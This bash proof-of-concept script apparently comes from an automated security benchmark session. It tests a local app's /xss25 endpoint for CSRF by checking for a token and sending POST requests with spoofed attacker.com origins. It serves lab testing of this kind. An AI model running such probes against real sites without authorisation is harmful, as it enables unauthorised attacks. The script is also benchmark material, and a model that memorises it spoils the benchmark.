#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /xss25 endpoint by submitting a POST request without CSRF token validation, showing the endpoint accepts requests from any origin.
# Target: ./repo
# Created: 2025-11-05T17:26:54.466Z
# Session: benchmark-XBEN-004-24-mhm9gmmb

# CSRF Vulnerability POC - /xss25 Endpoint
# This script demonstrates that the /xss25 endpoint accepts POST requests
# without CSRF token validation from arbitrary origins.

TARGET="http://localhost:5001"
ENDPOINT="/xss25"

echo "=========================================="
echo "CSRF Vulnerability POC - /xss25 Endpoint"
echo "=========================================="
echo ""

# Test 1: First, check if the endpoint returns a form (GET request)
echo "[*] Step 1: Fetching the /xss25 endpoint to check for CSRF tokens in the form"
echo "[*] URL: ${TARGET}${ENDPOINT}"
echo ""

FORM_RESPONSE=$(curl -s -X GET "${TARGET}${ENDPOINT}")
echo "[*] Form Response (first 500 chars):"
echo "$FORM_RESPONSE" | head -c 500
echo ""
echo ""

# Check if CSRF token is present in the form
if echo "$FORM_RESPONSE" | grep -qi "csrf\|token"; then
    echo "[!] CSRF token might be present in form"
else
    echo "[+] No CSRF token found in form HTML"
fi

echo ""
echo "[*] Step 2: Attempting to submit POST request WITHOUT CSRF token"
echo "[*] This simulates an attacker submitting a form from a different origin"
echo ""

# Test 2: Submit POST request with spoofed origin/referer (simulating CSRF attack)
POST_RESPONSE=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/attack.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=csrf_test_payload" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$POST_RESPONSE" | tail -n 1)
RESPONSE_BODY=$(echo "$POST_RESPONSE" | head -n -1)

echo "[*] POST Request Details:"
echo "    Origin: http://attacker.com"
echo "    Referer: http://attacker.com/attack.html"
echo "    Data: solution=csrf_test_payload"
echo ""
echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Server accepted POST without CSRF token!"
    echo "[+] HTTP $HTTP_CODE - Request was processed"
else
    echo "[-] Server returned HTTP $HTTP_CODE - may have CSRF protection"
fi

echo ""
echo "[*] Step 3: Checking if Origin/Referer validation exists"
echo "[*] Making POST request with mismatched Origin header"
echo ""

# Test 3: Check if server validates Origin/Referer
POST_RESPONSE2=$(curl -s -X POST "${TARGET}${ENDPOINT}" \
  -H "Origin: http://evil.attacker.com" \
  -H "Referer: http://completely.different.domain/page.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=csrf_test_2" \
  -w "\n%{http_code}")

HTTP_CODE2=$(echo "$POST_RESPONSE2" | tail -n 1)

echo "[*] POST with mismatched Origin: http://evil.attacker.com"
echo "[*] HTTP Status Code: $HTTP_CODE2"
echo ""

if [ "$HTTP_CODE2" = "200" ] || [ "$HTTP_CODE2" = "201" ]; then
    echo "[+] No Origin/Referer validation detected!"
    echo "[+] CSRF vulnerability confirmed - requests accepted from any origin"
else
    echo "[-] Some validation may be in place (HTTP $HTTP_CODE2)"
fi

echo ""
echo "=========================================="
echo "CONCLUSION:"
echo "=========================================="

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
    echo "[+] VULNERABILITY CONFIRMED"
    echo "[+] The /xss25 endpoint accepts POST requests without CSRF token validation"
    echo "[+] An attacker can forge requests from a victim's browser"
    exit 0
else
    echo "[-] Could not confirm CSRF vulnerability"
    exit 1
fi